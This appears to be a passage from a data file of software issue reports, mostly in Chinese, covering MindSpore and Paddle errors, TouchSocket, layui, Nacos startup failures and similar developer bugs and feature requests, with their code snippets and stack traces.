compile_and_run File ""/root/archiconda3/envs/zhujunan3.7/lib/python3.7/site-packages/mindspore/nn/cell.py"", line 472 in __call__ File ""/home/zja/MindSporeTest/share/utils.py"", line 181 in __call__ File ""/home/zja/MindSporeTest/share/ops/primitive/nondeterministicints_ops.py"", line 33 in forward_mindspore_impl File ""/home/zja/MindSporeTest/operations/test_nondeterministicints.py"", line 456 in test_non_deterministic_ints_aa File ""/root/archiconda3/envs/zhujunan3.7/lib/python3.7/site-packages/_pytest/python.py"", line 167 in pytest_pyfunc_call File ""/root/archiconda3/envs/zhujunan3.7/lib/python3.7/site-packages/pluggy/callers.py"", line 187 in _multicall File ""/root/archiconda3/envs/zhujunan3.7/lib/python3.7/site-packages/pluggy/manager.py"", line 87 in &lt;lambda&gt; File ""/root/archiconda3/envs/zhujunan3.7/lib/python3.7/site-packages/pluggy/manager.py"", line 93 in _hookexec File ""/root/archiconda3/envs/zhujunan3.7/lib/python3.7/site-packages/pluggy/hooks.py"", line 286 in __call__ File ""/root/archiconda3/envs/zhujunan3.7/lib/python3.7/site-packages/_pytest/python.py"", line 1445 in runtest File ""/root/archiconda3/envs/zhujunan3.7/lib/python3.7/site-packages/_pytest/runner.py"", line 134 in pytest_runtest_call File ""/root/archiconda3/envs/zhujunan3.7/lib/python3.7/site-packages/pluggy/callers.py"", line 187 in _multicall File ""/root/archiconda3/envs/zhujunan3.7/lib/python3.7/site-packages/pluggy/manager.py"", line 87 in &lt;lambda&gt; File ""/root/archiconda3/envs/zhujunan3.7/lib/python3.7/site-packages/pluggy/manager.py"", line 93 in _hookexec File ""/root/archiconda3/envs/zhujunan3.7/lib/python3.7/site-packages/pluggy/hooks.py"", line 286 in __call__ File ""/root/archiconda3/envs/zhujunan3.7/lib/python3.7/site-packages/_pytest/runner.py"", line 210 in &lt;lambda&gt; File ""/root/archiconda3/envs/zhujunan3.7/lib/python3.7/site-packages/_pytest/runner.py"", line 237 in from_call File ""/root/archiconda3/envs/zhujunan3.7/lib/python3.7/site-packages/_pytest/runner.py"", line 210 in call_runtest_hook File ""/root/archiconda3/envs/zhujunan3.7/lib/python3.7/site-packages/_pytest/runner.py"", line 185 in call_and_report File ""/root/archiconda3/envs/zhujunan3.7/lib/python3.7/site-packages/_pytest/runner.py"", line 99 in runtestprotocol File ""/root/archiconda3/envs/zhujunan3.7/lib/python3.7/site-packages/_pytest/runner.py"", line 84 in pytest_runtest_protocol File ""/root/archiconda3/envs/zhujunan3.7/lib/python3.7/site-packages/pluggy/callers.py"", line 187 in _multicall File ""/root/archiconda3/envs/zhujunan3.7/lib/python3.7/site-packages/pluggy/manager.py"", line 87 in &lt;lambda&gt; File ""/root/archiconda3/envs/zhujunan3.7/lib/python3.7/site-packages/pluggy/manager.py"", line 93 in _hookexec File ""/root/archiconda3/envs/zhujunan3.7/lib/python3.7/site-packages/pluggy/hooks.py"", line 286 in __call__ File ""/root/archiconda3/envs/zhujunan3.7/lib/python3.7/site-packages/_pytest/main.py"", line 271 in pytest_runtestloop File ""/root/archiconda3/envs/zhujunan3.7/lib/python3.7/site-packages/pluggy/callers.py"", line 187 in _multicall File ""/root/archiconda3/envs/zhujunan3.7/lib/python3.7/site-packages/pluggy/manager.py"", line 87 in &lt;lambda&gt; File ""/root/archiconda3/envs/zhujunan3.7/lib/python3.7/site-packages/pluggy/manager.py"", line 93 in _hookexec File ""/root/archiconda3/envs/zhujunan3.7/lib/python3.7/site-packages/pluggy/hooks.py"", line 286 in __call__ File ""/root/archiconda3/envs/zhujunan3.7/lib/python3.7/site-packages/_pytest/main.py"", line 247 in _main File ""/root/archiconda3/envs/zhujunan3.7/lib/python3.7/site-packages/_pytest/main.py"", line 197 in wrap_session File ""/root/archiconda3/envs/zhujunan3.7/lib/python3.7/site-packages/_pytest/main.py"", line 240 in pytest_cmdline_main File ""/root/archiconda3/envs/zhujunan3.7/lib/python3.7/site-packages/pluggy/callers.py"", line 187 in _multicall File ""/root/archiconda3/envs/zhujunan3.7/lib/python3.7/site-packages/pluggy/manager.py"", line 87 in &lt;lambda&gt; File ""/root/archiconda3/envs/zhujunan3.7/lib/python3.7/site-packages/pluggy/manager.py"", line 93 in _hookexec File ""/root/archiconda3/envs/zhujunan3.7/lib/python3.7/site-packages/pluggy/hooks.py"", line 286 in __call__ File ""/root/archiconda3/envs/zhujunan3.7/lib/python3.7/site-packages/_pytest/config/__init__.py"", line 93 in main File ""/root/archiconda3/envs/zhujunan3.7/bin/pytest"", line 10 in &lt;module&gt; Segmentation fault (core dumped)"
连接阻塞,"组件名及版本号 TouchSocket 0.7.5 ` TouchSocketConfig config = new TouchSocketConfig(); config.SetRemoteIPHost(new IPHost(""127.0.0.1:5555"")) .UsePlugin() .SetBufferLength(1024 * 10); 服务端先不开的情况下，用这个代码去连接，然后程序就卡在这里了。再次启动服务器就没用了。 无 期待设置好后代码运行，不影响，再次启动可以连上服务器   <code>: //载入配置 tcpClient.Setup(config); tcpClient.Connect();`"
[Bug] 使用 SKIT.FlurlHttpClient.Wechat 库的若干问题,1. 关于 的误用。 该方法内部已经是在判断了 ，所以类似下面这种写法条件是恒不成立的： 正确的做法应该是： 该问题存在于： <em>CoreCms.Net.RedisMQ\Subscribe\SendWxTemplateMessageSubscribe.cs</em> <em>CoreCms.Net.Services\Share\CoreCmsShareServices.cs</em> 2. 关于 JSON 序列化器的配置： 上述代码只需在 Client 的工厂类的 Create() 方法中执行一次即可，无需业务代码中重复调用。多次实例化容易对 GC 造成不必要的负担。 同样地，上述代码只需要在 Client 的工厂类的构造函数中执行一次即可，无需在每次在 Create() 中调用。 该问题存在于： <em>CoreCms.Net.Task\RefreshWeChatAccessTokenJob.cs</em> <em>CoreCms.Net.WeChat.Service\Services\HttpClients\WechatApiHttpClientFactory.cs</em> 3. 关于内存泄漏问题。 微信官方提供的 存在多处 对象未能正确释放的错误，会导致内存泄漏问题出现。 你可以自行修改相关错误；也可以使用 SKIT.FlurlHttpClient.Wechat 库中封装好的无内存泄漏版工具类和扩展方法。 该问题存在于： <em>CoreCms.Net.Web.WebApi\Controllers\WeChatOAuth\WxOpenController.cs</em>   <code>: response.IsSuccessful() response.ErrorCode == 0 if (response.IsSuccessful() &amp;&amp; response.ErrorCode == (int)WeChatReturnCode.ReturnCode.错误) { // Ops! } if (response.IsSuccessful()) { // Todo } else { switch (response.ErrorCode) { case (int)WeChatReturnCode.ReturnCode.错误: { // Ops! } break; } } client.Configure(settings =&gt; { settings.JsonSerializer = new FlurlNewtonsoftJsonSerializer(); }); FlurlHttp.GlobalSettings.FlurlClientFactory = new DelegatingFlurlClientFactory(_httpClientFactory); WXBizMsgCrypt IDisposable
怎么改变连线样式,"找到src/components/ef/mixins.js文件 修改 jsplumbSetting.Connector 属性   <code>: // 连线的样式，直线或者曲线等，可选值: StateMachine、Flowchart，Bezier、Straight Connector: ['Bezier', {curviness: 100}], // Connector: ['Straight', {stub: 20, gap: 1}], // Connector: ['Flowchart', {stub: 30, gap: 1, alwaysRespectStubs: false, midpoint: 0.5, cornerRadius: 10}], // Connector: ['StateMachine', {margin: 5, curviness: 10, proximityLimit: 80}],"
Input to Inference Engine,"Input protobuf for Inference Engine Please refer to Xreki's excellent PR #7315:Implement SE-ResNeXt on fluid to get an overview of the design of Inference Engine. The design of inference engine depends on: how we store the protobuf message of the ProgramDesc of the in fluid. The aim of this document is to look at two different approaches for doing it, and evaluate some of the pros and cons of each approach. If we look at an existing training and inference example in fluid for example recognize_digits, we see that there are two objects of the Program class in Python, each of which has a ProgramDesc as its member. The ProgramDesc obtained from the basically represents the neural network during the training phase. However, for testing/inference phase, as in the above example, we and the original ProgramDesc, to prune out irrelevant operators and obtain a ProgramDesc (in the ) which is suitable for inference. (For more details, see implementation: link). To simplify the writing, we call the first ProgramDesc as ""training ProgramDesc"" and the latter one as ""inference ProgramDesc"". An important thing to note is that ""inference ProgramDesc"" has lesser information that the ""training ProgramDesc"" as we prune out operators which aren't required for inference. Approach 1: Use inference ProgramDesc Under the subsection inference-program of the PR 7315, it is proposed that the ""protobof message of the is saved using ."" Based on the current implementation of , we observe that ""inference ProgramDesc"" is stored (in addition to model parameters). Now, there are again two options: We can modify the current implementation to save the inference ProgramDesc which will have and operators as well (which isn't done in the current implementation). This has the benefit that the user who wants to do inference, doesn't need to worry about providing feed and fetch lists to the Inference engine API. We use the current implmentation as is, and save the inference ProgramDesc without and operators. Here, the user must provide feed and fetch lists as input to the Inference engine API. However, the main drawback of both of the above options and saving inference ProgramDesc is that we will need to have extra provisions to allow online training. More specifically, we will need to also save the ""training ProgramDesc"" and read it additionally to support online training. Moreover, we might face issues related to parameter sharing when we want to do both inference and also modify the parameters. Approach 2: Use training ProgramDesc To address the limitation of the first approach, at the cost of extra computation, is to save the ""training ProgramDesc"". In order to do inference, we can perform pruning and optimization on this ProgramDesc to obtain the ""inference ProgramDesc"". However, in order to do the pruning, we will need the user to specify feed and fetch lists to the Inference engine. Even though we will have to perform pruning on the ""training ProgramDesc"" in the Inference Engine, we will still be able to support online training, as we won't have to worry about saving/reading an additional ""training ProgramDesc"".   <code>: main_program default_main_program() prune() inference_optimize() inference_program main_program fluid.io.save_inference_model fluid.io.save_inference_model feed fetch feed fetch"
单测整理：将单测行覆盖率提高到90%,1. 将单测行覆盖率提高到90% 单测的行覆盖率是代码质量的一个基本保证。 2.对于http接口的Mock 之前使用mockserver-netty，但不太稳定，经常概率性出现I/O等错误。 现在使用okhttp3的mockwebserver。 具体做法可以参考 类   <code>: com.dtflys.test.http.TestGetClient
【已解决】layui的table组件导出功能不支持IE,"版本：2.6.12 描述：导出功能不支持IE 我这有个业务系统，需要layui组件支持IE导出，经过研究，终于实现了。大大们可以看一下，亲测可用，是否可以同步到下一版本中？ k.exportFile = function (e, t, i) { var d, a, l, c, r = this, s = (t = t || k.clearCacheKey(k.cache[e]), y.that[e]), n = y.config[e] || {}, o = { csv: ""text/csv"", xls: ""application/vnd.ms-excel"" }[i = i || ""csv""], u = document.createElement(""a""); // if (x.ie) // return p.error(""IE_NOT_SUPPORT_EXPORTS"");   <code>: var dString = (d = [], a = [], l = [], c = {}, layui.each(t, function (l, n) { var o = []; ""object"" == typeof e ? (layui.each(e, function (e, t) { 0 == l &amp;&amp; d.push(t || """") }), layui.each(k.clearCacheKey(n), function (e, t) { o.push('""' + (t || """") + '""') })) : k.eachCols(e, function (e, t) { var i, a; t.field &amp;&amp; ""normal"" == t.type &amp;&amp; (t.hide ? 0 == l &amp;&amp; (c[t.field] = !0) : (i = n[t.field], a = r.layBody.find('tr[data-index=""' + l + '""]&gt;td'), null == i &amp;&amp; (i = """"), 0 == l &amp;&amp; d.push(t.title || """"), o.push('""' + m.call(s, { item3: t, content: i, tplData: n, text: ""text"", obj: s.commonMember.call(a.eq(0), { td: function (e) { return a.filter('[data-field=""' + e + '""]') } }) }) + '""'))) }), a.push(o.join("","")) }), layui.each(r.dataTotal, function (e, t) { c[e] || l.push(t) }), d.join("","") + ""\r\n"" + a.join(""\r\n"") + ""\r\n"" + l.join("","")); u.href = ""data:"" + o + "";charset=utf-8,\ufeff"" + encodeURIComponent(dString); if (x.ie) { var meta = {csv: ""text/csv"", xls: ""application/vnd.ms-excel""}[i];// meta格式 var types = i; navigator.msSaveBlob(new Blob(['\ufeff' + dString], {type: meta + ';charset=utf-8;'}), '导出文件.' + types) } else { u.download = (n.title || ""table_"" + (n.index || """")) + ""."" + i, document.body.appendChild(u), u.click(), document.body.removeChild(u) } }"
【众智】【计算-AICPU接入】RandomPoissonV2,RandomPoissonV2 从由速率描述的泊松分布中输出随机值。 接口目录：mindspore/ops/operations/random_ops.py 参数 类型 输入/输出/属性 说明 shape rate y seed int 属性 seed2 int 属性 dtype type 属性 对应底层算子 对应底层AICPU算子RandomPoisson 无反向   <code>: class RandomPoisson(Primitive):
Paddle2.0rc DataLoader自定义数据读取报错,"参考官方文档测试自定义数据集，paddle.io.DataLoader执行报错 https://www.paddlepaddle.org.cn/documentation/docs/zh/2.0-rc/guides/02_paddle2.0_develop/02_data_load_cn.html#id3 代码 错误日志 运行环境 系统：ubuntu18.04 driver: 450.51.06 cuda：11.0.3 cudnn: 8.0.3.33-1+cuda11.0 python: 3.6.9   <code>: import paddle from paddle.io import Dataset class MyDataset(Dataset): def __init__(self, mode='train'): super(MyDataset, self).__init__() if mode == 'train': self.data = [ ['traindata1', 'label1'], ['traindata2', 'label2'], ['traindata3', 'label3'], ['traindata4', 'label4'], ] else: self.data = [ ['testdata1', 'label1'], ['testdata2', 'label2'], ['testdata3', 'label3'], ['testdata4', 'label4'], ] def __getitem__(self, index): data = self.data[index][0] label = self.data[index][1] return data, label def __len__(self): return len(self.data) train_dataset = MyDataset(mode='train') train_loader = paddle.io.DataLoader(train_dataset, places=paddle.CPUPlace(), batch_size=64, shuffle=True) for batch_id, data in enumerate(train_loader()): x_data = data[0] y_data = data[1] print(x_data.numpy().shape) print(y_data.numpy().shape) WARNING:root:DataLoader reader thread raised an exception. Exception in thread Thread-5: Traceback (most recent call last): File ""/usr/lib/python3.6/threading.py"", line 916, in _bootstrap_inner self.run() File ""/usr/lib/python3.6/threading.py"", line 864, in run self._target(*self._args, **self._kwargs) File ""/home/simpleai/.local/lib/python3.6/site-packages/paddle/fluid/dataloader/dataloader_iter.py"", line 323, in _thread_loop six.reraise(*sys.exc_info()) File ""/home/simpleai/.local/lib/python3.6/site-packages/six.py"", line 703, in reraise raise value File ""/home/simpleai/.local/lib/python3.6/site-packages/paddle/fluid/dataloader/dataloader_iter.py"", line 293, in _thread_loop batch = self._dataset_fetcher.fetch(indices) File ""/home/simpleai/.local/lib/python3.6/site-packages/paddle/fluid/dataloader/fetcher.py"", line 53, in fetch return self.collate_fn(data) File ""/home/simpleai/.local/lib/python3.6/site-packages/paddle/fluid/dataloader/dataloader_iter.py"", line 94, in default_collate_fn raise RuntimeError(""Unknown data type {}"".format(type(slot[0]))) RuntimeError: Unknown data type &lt;class 'str'&gt; --------------------------------------------------------------------------- EnforceNotMet Traceback (most recent call last) &lt;ipython-input-6-424de2e95c1c&gt; in &lt;module&gt; 2 3 train_loader = paddle.io.DataLoader(train_dataset, places=paddle.CPUPlace(), batch_size=64, shuffle=True) ----&gt; 4 for batch_id, data in enumerate(train_loader()): 5 x_data = data[0] 6 y_data = data[1] ~/.local/lib/python3.6/site-packages/paddle/fluid/dataloader/dataloader_iter.py in __next__(self) 339 try: 340 if in_dygraph_mode(): --&gt; 341 return self._reader.read_next_var_list() 342 else: 343 if self._return_list: EnforceNotMet: -------------------------------------- C++ Traceback (most recent call last): -------------------------------------- 0 std::thread::_State_impl&lt;std::thread::_Invoker&lt;std::tuple&lt;ThreadPool::ThreadPool(unsigned long)::{lambda()#1}&gt; &gt; &gt;::_M_run() 1 std::__future_base::_State_baseV2::_M_do_set(std::function&lt;std::unique_ptr&lt;std::__future_base::_Result_base, std::__future_base::_Result_base::_Deleter&gt; ()&gt;*, bool*) 2 paddle::operators::reader::PyReader::ReadNext(std::vector&lt;paddle::framework::LoDTensor, std::allocator&lt;paddle::framework::LoDTensor&gt; &gt;*) 3 paddle::operators::reader::BlockingQueue&lt;std::vector&lt;paddle::framework::LoDTensor, std::allocator&lt;paddle::framework::LoDTensor&gt; &gt; &gt;::Receive(std::vector&lt;paddle::framework::LoDTensor, std::allocator&lt;paddle::framework::LoDTensor&gt; &gt;*) 4 paddle::platform::EnforceNotMet::EnforceNotMet(std::string const&amp;, char const*, int) 5 paddle::platform::GetCurrentTraceBackString[abi:cxx11]() ---------------------- Error Message Summary: ---------------------- FatalError: Blocking queue is killed because the data reader raises an exception. [Hint: Expected killed_ != true, but received killed_:1 == true:1.] (at /paddle/paddle/fluid/operators/reader/blocking_queue.h:154)"
启动Register报错,"pig版本:4.1 是否修改包名: 没有 系统环境:win10 说明：开始能运行，后运行报这个错。下载了2015 vc++ 重启依旧无法解决。   <code>: Error starting ApplicationContext. To display the conditions report re-run your application with 'debug' enabled. 2021-08-24 15:36:02.067 ERROR 3448 --- [ main] o.s.boot.SpringApplication : Application run failed org.springframework.beans.factory.UnsatisfiedDependencyException: Error creating bean with name 'instanceOperatorClientImpl' defined in URL [jar:file:/D:/repository/com/pig4cloud/nacos/nacos-naming/2.0.2/nacos-naming-2.0.2.jar!/com/alibaba/nacos/naming/core/InstanceOperatorClientImpl.class]: Unsatisfied dependency expressed through constructor parameter 1; nested exception is org.springframework.beans.factory.UnsatisfiedDependencyException: Error creating bean with name 'clientOperationServiceProxy' defined in URL [jar:file:/D:/repository/com/pig4cloud/nacos/nacos-naming/2.0.2/nacos-naming-2.0.2.jar!/com/alibaba/nacos/naming/core/v2/service/ClientOperationServiceProxy.class]: Unsatisfied dependency expressed through constructor parameter 1; nested exception is org.springframework.beans.factory.BeanCreationException: Error creating bean with name 'persistentClientOperationServiceImpl' defined in URL [jar:file:/D:/repository/com/pig4cloud/nacos/nacos-naming/2.0.2/nacos-naming-2.0.2.jar!/com/alibaba/nacos/naming/core/v2/service/impl/PersistentClientOperationServiceImpl.class]: Bean instantiation via constructor failed; nested exception is org.springframework.beans.BeanInstantiationException: Failed to instantiate [com.alibaba.nacos.naming.core.v2.service.impl.PersistentClientOperationServiceImpl]: Constructor threw exception; nested exception is java.lang.IllegalStateException: Fail to init node, please see the logs to find the reason. at org.springframework.beans.factory.support.ConstructorResolver.createArgumentArray(ConstructorResolver.java:800) at org.springframework.beans.factory.support.ConstructorResolver.autowireConstructor(ConstructorResolver.java:229) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.autowireConstructor(AbstractAutowireCapableBeanFactory.java:1354) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.createBeanInstance(AbstractAutowireCapableBeanFactory.java:1204) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.doCreateBean(AbstractAutowireCapableBeanFactory.java:564) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.createBean(AbstractAutowireCapableBeanFactory.java:524) at org.springframework.beans.factory.support.AbstractBeanFactory.lambda$doGetBean$0(AbstractBeanFactory.java:335) at org.springframework.beans.factory.support.DefaultSingletonBeanRegistry.getSingleton(DefaultSingletonBeanRegistry.java:234) at org.springframework.beans.factory.support.AbstractBeanFactory.doGetBean(AbstractBeanFactory.java:333) at org.springframework.beans.factory.support.AbstractBeanFactory.getBean(AbstractBeanFactory.java:208) at org.springframework.beans.factory.support.DefaultListableBeanFactory.preInstantiateSingletons(DefaultListableBeanFactory.java:944) at org.springframework.context.support.AbstractApplicationContext.finishBeanFactoryInitialization(AbstractApplicationContext.java:918) at org.springframework.context.support.AbstractApplicationContext.refresh(AbstractApplicationContext.java:583) at org.springframework.boot.web.servlet.context.ServletWebServerApplicationContext.refresh(ServletWebServerApplicationContext.java:145) at org.springframework.boot.SpringApplication.refresh(SpringApplication.java:754) at org.springframework.boot.SpringApplication.refreshContext(SpringApplication.java:434) at org.springframework.boot.SpringApplication.run(SpringApplication.java:338) at org.springframework.boot.SpringApplication.run(SpringApplication.java:1343) at org.springframework.boot.SpringApplication.run(SpringApplication.java:1332) at com.alibaba.nacos.PigxNacosApplication.main(PigxNacosApplication.java:39) Caused by: org.springframework.beans.factory.UnsatisfiedDependencyException: Error creating bean with name 'clientOperationServiceProxy' defined in URL [jar:file:/D:/repository/com/pig4cloud/nacos/nacos-naming/2.0.2/nacos-naming-2.0.2.jar!/com/alibaba/nacos/naming/core/v2/service/ClientOperationServiceProxy.class]: Unsatisfied dependency expressed through constructor parameter 1; nested exception is org.springframework.beans.factory.BeanCreationException: Error creating bean with name 'persistentClientOperationServiceImpl' defined in URL [jar:file:/D:/repository/com/pig4cloud/nacos/nacos-naming/2.0.2/nacos-naming-2.0.2.jar!/com/alibaba/nacos/naming/core/v2/service/impl/PersistentClientOperationServiceImpl.class]: Bean instantiation via constructor failed; nested exception is org.springframework.beans.BeanInstantiationException: Failed to instantiate [com.alibaba.nacos.naming.core.v2.service.impl.PersistentClientOperationServiceImpl]: Constructor threw exception; nested exception is java.lang.IllegalStateException: Fail to init node, please see the logs to find the reason. at org.springframework.beans.factory.support.ConstructorResolver.createArgumentArray(ConstructorResolver.java:800) at org.springframework.beans.factory.support.ConstructorResolver.autowireConstructor(ConstructorResolver.java:229) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.autowireConstructor(AbstractAutowireCapableBeanFactory.java:1354) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.createBeanInstance(AbstractAutowireCapableBeanFactory.java:1204) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.doCreateBean(AbstractAutowireCapableBeanFactory.java:564) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.createBean(AbstractAutowireCapableBeanFactory.java:524) at org.springframework.beans.factory.support.AbstractBeanFactory.lambda$doGetBean$0(AbstractBeanFactory.java:335) at org.springframework.beans.factory.support.DefaultSingletonBeanRegistry.getSingleton(DefaultSingletonBeanRegistry.java:234) at org.springframework.beans.factory.support.AbstractBeanFactory.doGetBean(AbstractBeanFactory.java:333) at org.springframework.beans.factory.support.AbstractBeanFactory.getBean(AbstractBeanFactory.java:208) at org.springframework.beans.factory.config.DependencyDescriptor.resolveCandidate(DependencyDescriptor.java:276) at org.springframework.beans.factory.support.DefaultListableBeanFactory.doResolveDependency(DefaultListableBeanFactory.java:1380) at org.springframework.beans.factory.support.DefaultListableBeanFactory.resolveDependency(DefaultListableBeanFactory.java:1300) at org.springframework.beans.factory.support.ConstructorResolver.resolveAutowiredArgument(ConstructorResolver.java:887) at org.springframework.beans.factory.support.ConstructorResolver.createArgumentArray(ConstructorResolver.java:791) ... 19 common frames omitted Caused by: org.springframework.beans.factory.BeanCreationException: Error creating bean with name 'persistentClientOperationServiceImpl' defined in URL [jar:file:/D:/repository/com/pig4cloud/nacos/nacos-naming/2.0.2/nacos-naming-2.0.2.jar!/com/alibaba/nacos/naming/core/v2/service/impl/PersistentClientOperationServiceImpl.class]: Bean instantiation via constructor failed; nested exception is org.springframework.beans.BeanInstantiationException: Failed to instantiate [com.alibaba.nacos.naming.core.v2.service.impl.PersistentClientOperationServiceImpl]: Constructor threw exception; nested exception is java.lang.IllegalStateException: Fail to init node, please see the logs to find the reason. at org.springframework.beans.factory.support.ConstructorResolver.instantiate(ConstructorResolver.java:315) at org.springframework.beans.factory.support.ConstructorResolver.autowireConstructor(ConstructorResolver.java:296) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.autowireConstructor(AbstractAutowireCapableBeanFactory.java:1354) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.createBeanInstance(AbstractAutowireCapableBeanFactory.java:1204) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.doCreateBean(AbstractAutowireCapableBeanFactory.java:564) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.createBean(AbstractAutowireCapableBeanFactory.java:524) at org.springframework.beans.factory.support.AbstractBeanFactory.lambda$doGetBean$0(AbstractBeanFactory.java:335) at org.springframework.beans.factory.support.DefaultSingletonBeanRegistry.getSingleton(DefaultSingletonBeanRegistry.java:234) at org.springframework.beans.factory.support.AbstractBeanFactory.doGetBean(AbstractBeanFactory.java:333) at org.springframework.beans.factory.support.AbstractBeanFactory.getBean(AbstractBeanFactory.java:208) at org.springframework.beans.factory.config.DependencyDescriptor.resolveCandidate(DependencyDescriptor.java:276) at org.springframework.beans.factory.support.DefaultListableBeanFactory.doResolveDependency(DefaultListableBeanFactory.java:1380) at org.springframework.beans.factory.support.DefaultListableBeanFactory.resolveDependency(DefaultListableBeanFactory.java:1300) at org.springframework.beans.factory.support.ConstructorResolver.resolveAutowiredArgument(ConstructorResolver.java:887) at org.springframework.beans.factory.support.ConstructorResolver.createArgumentArray(ConstructorResolver.java:791) ... 33 common frames omitted Caused by: org.springframework.beans.BeanInstantiationException: Failed to instantiate [com.alibaba.nacos.naming.core.v2.service.impl.PersistentClientOperationServiceImpl]: Constructor threw exception; nested exception is java.lang.IllegalStateException: Fail to init node, please see the logs to find the reason. at org.springframework.beans.BeanUtils.instantiateClass(BeanUtils.java:225) at org.springframework.beans.factory.support.SimpleInstantiationStrategy.instantiate(SimpleInstantiationStrategy.java:117) at org.springframework.beans.factory.support.ConstructorResolver.instantiate(ConstructorResolver.java:311) ... 47 common frames omitted Caused by: java.lang.IllegalStateException: Fail to init node, please see the logs to find the reason. at com.alipay.sofa.jraft.RaftServiceFactory.createAndInitRaftNode(RaftServiceFactory.java:48) at com.alipay.sofa.jraft.RaftGroupService.start(RaftGroupService.java:129) at com.alibaba.nacos.core.distributed.raft.JRaftServer.createMultiRaftGroup(JRaftServer.java:268) at com.alibaba.nacos.core.distributed.raft.JRaftProtocol.addRequestProcessors(JRaftProtocol.java:163) at com.alibaba.nacos.naming.core.v2.service.impl.PersistentClientOperationServiceImpl.&lt;init&gt;(PersistentClientOperationServiceImpl.java:94) at sun.reflect.NativeConstructorAccessorImpl.newInstance0(Native Method) at sun.reflect.NativeConstructorAccessorImpl.newInstance(NativeConstructorAccessorImpl.java:62) at sun.reflect.DelegatingConstructorAccessorImpl.newInstance(DelegatingConstructorAccessorImpl.java:45) at java.lang.reflect.Constructor.newInstance(Constructor.java:423) at org.springframework.beans.BeanUtils.instantiateClass(BeanUtils.java:212) ... 49 common frames omitted"
Optimize cache_admin tool to allow multiple session destroy,"Task MindCon极客周 Task Description Cache is a new feature of Mindspore to speed up its data processing pipeline by allowing the user to access the dataset in their local memory instead of disk. We have a standalone cache server, which communicates to the cache client use gRPC and performs data transmission. The cache server itself is a binary called in the MindData build directory, and we have a command-line tool called to startup and shutdown the cache server. In order to connect to the cache_server, users first need to create a session via the tool, and the specific command is . The users are also able to list their current sessions via and delete a single session with certain session id via Right now we only support a single session deletion at a time, so can you please optimize it to support multiple session deletion? Task Goal Optimize the command to allow multiple session destroy. For example, allow the users do: and delete all the given sessions. Materials Check this for some docs about cache: tutorial（概述）：https://www.mindspore.cn/tutorial/training/zh-CN/master/advanced_use/enable_cache.html?highlight=datasetcache doc（详述）： https://www.mindspore.cn/doc/programming_guide/zh-CN/master/cache.html Milestones Try to build mindspore from source Make use of the tool to create/delete/list sessions Related cache code is under the path , and are the two most important files that you probably want to poke around. Sub Task No. Task Description Issue ID 1 Use cache_admin tool to create/delete/list sessions 2 Optimize cache_admin tool to let it support multiple session destroy Way for Discussion If you have question or problems, please comment in this issue.   <code>: cache_server cache_admin cache_admin cache_admin --generate_session cache_admin --list_sessions cache_admin --destroy_session &lt;session_id&gt; cache_admin --destroy_session cache_admin --destroy_session &lt;session_id1&gt; &lt;session_id2&gt; ... &lt;session_idn&gt; cache_admin mindspore/ccsrc/minddata/dataset/engine/cache cache_admin.cc cache_admin_arg.cc"
Excel 导出时不能匹配字典标签,"当前 Excel 导出时支持 来指定 key 的 value。如下: 但是 key 值很多的情况下这样写起来很麻烦，需要使用字典值来匹配标签。例如:   <code>: readConverterExp @Excel(name = ""状态"", readConverterExp = ""1=正常, 2=停用"") @Excel(name = ""状态"", dictType = ""status"")"
[MS][用户接口-RandPerm]test cases has problem on ascend,"算子在ascend平台，执行报错 / 硬件环境: /device ascend/GPU/CPU/kirin/等其他芯片 : -- MindSpore version : -- Python version : -- OS platform and distribution : -- GCC/Compiler version : (/): /mode pynative /mode graph test_p_randperm_input_int32_output_float16 def test_p_randperm_input_int32_output_float16(): n = Tensor([65505], mstype.int64) fact = RandpermMock(attributes={'max_length': 65505, 'pad': -1, 'dtype': mstype.float16}, inputs=n) test_randperm.py:150: ../share/ops/primitive/randperm_ops.py:79: in forward_cmp output = self.forward_mindspore_impl() ../share/ops/primitive/randperm_ops.py:73: in forward_mindspore_impl out = net(self.n) /root/archiconda3/envs/sjx_high/lib/python3.7/site-packages/mindspore/nn/cell.py:651: in call raise err /root/archiconda3/envs/sjx_high/lib/python3.7/site-packages/mindspore/nn/cell.py:647: in call output = self._run_construct(args, kwargs) /root/archiconda3/envs/sjx_high/lib/python3.7/site-packages/mindspore/nn/cell.py:413: in _run_construct output = self.construct(*cast_inputs, **kwargs) ../share/ops/primitive/randperm_ops.py:18: in construct return self.randperm(n) /root/archiconda3/envs/sjx_high/lib/python3.7/site-packages/mindspore/ops/primitive.py:314: in call return _run_op(self, self.name, args) /root/archiconda3/envs/sjx_high/lib/python3.7/site-packages/mindspore/common/api.py:97: in wrapper results = fn(*arg, **kwargs) /root/archiconda3/envs/sjx_high/lib/python3.7/site-packages/mindspore/ops/primitive.py:802: in _run_op output = _pynative_executor.real_run_op(obj, op_name, args) self = &lt;mindspore.common.api._PyNativeExecutor object at 0xffff7b4c6b90&gt; args = (Prim[Randperm]&lt;max_length=65505, pad=-1, dtype=Float16&gt;, 'Randperm', (Tensor(shape=[1], dtype=Int64, value= [65505]),)) E TypeError: Can not select a valid kernel info for [Randperm] in AI CORE or AI CPU kernel info candidates list. E E ---------------------------------------------------- E - Kernel Info Candidates List: E ---------------------------------------------------- E E AI CORE: E {} E AI CPU: E () -&gt; () E () -&gt; () E () -&gt; () E () -&gt; () E () -&gt; () E () -&gt; () E () -&gt; () E () -&gt; () E E Please check the given data type or shape: E AI CORE: : (&lt;Tensor[Int64], (1)&gt;) -&gt; (&lt;Tensor[Float16], {shape:(-2)|min shape:()|max shape:()}&gt;) E AI CPU: : (&lt;Tensor[Int64], (1)&gt;) -&gt; (&lt;Tensor[Float16], {shape:(-2)|min shape:()|max shape:()}&gt;) E For more details, please refer to 'Kernel Select Failed' at https://www.mindspore.cn E E ---------------------------------------------------- E - C++ Call Stack: (For framework developers) E ---------------------------------------------------- E mindspore/ccsrc/plugin/device/ascend/hal/hardware/ascend_graph_optimization.cc:379 SetOperatorInfo 